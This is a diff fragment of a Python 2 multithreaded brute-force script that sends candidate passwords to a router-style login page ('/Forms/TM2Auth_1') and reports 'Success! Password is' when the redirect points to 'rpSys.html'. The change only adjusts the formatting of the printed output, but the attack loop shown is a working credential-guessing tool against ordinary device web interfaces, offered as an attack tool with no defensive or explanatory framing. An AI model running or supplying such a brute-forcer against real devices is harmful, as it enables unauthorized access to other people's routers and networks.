@@ -36,13 +36,13 @@ class BruteThread(threading.Thread):
                 r = requests.post('http://'+target+'/Forms/TM2Auth_1', data=payload, allow_redirects=False, timeout=60)
                 location = r.headers['Location']
             except ConnectionError, e:
-                print 'Testing ' + dapw + ' Connection Error!'
+                print "\r\033[91m[-] Testing {} Connection Timeout\033[0m".format(dapw)
                 
             if 'rpSys.html' in location:
-                print '\r\033[94mSuccess! Password is: {}'.format(dapw)
+                print '\r\033[94mSuccess! Password is: {}\033[0m'.format(dapw)
                 os.kill(os.getpid(), 2)
             else:
-                print "\r\033[91m[-] Attempt failed. TEST: {}, RESULT: {}".format(dapw, 'Failed')
+                print "\r\033[91m[-] Attempt failed. TEST: {}, RESULT: {}\033[0m".format(dapw, 'Failed')
             self.queue.task_done()
 
 for i in range(1,10):
